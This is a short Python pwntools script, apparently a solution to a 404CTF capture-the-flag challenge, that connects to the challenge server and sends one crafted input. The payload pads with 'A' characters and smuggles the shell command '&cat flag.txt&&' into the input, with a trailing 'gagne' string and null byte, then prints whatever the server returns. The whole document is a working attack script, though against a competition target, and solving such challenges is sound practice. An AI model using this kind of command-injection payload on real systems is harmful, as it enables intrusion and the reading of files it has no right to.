from pwn import *

def exploit(remote_host, remote_port):
    # Connect to the remote host
    io = remote(remote_host, remote_port)
    


    # Final payload construction
    payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&cat flag.txt&&AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgagne\x00"
    
    # Send the payload
    io.sendline(payload)
    
    # Receive the response from the server
    response = io.recvall()
    print(response.decode())

if __name__ == "__main__":
    # Set the target host and port
    target_host = "challenges.404ctf.fr"
    target_port = 31958
    
    # Run the exploit
    exploit(target_host, target_port)
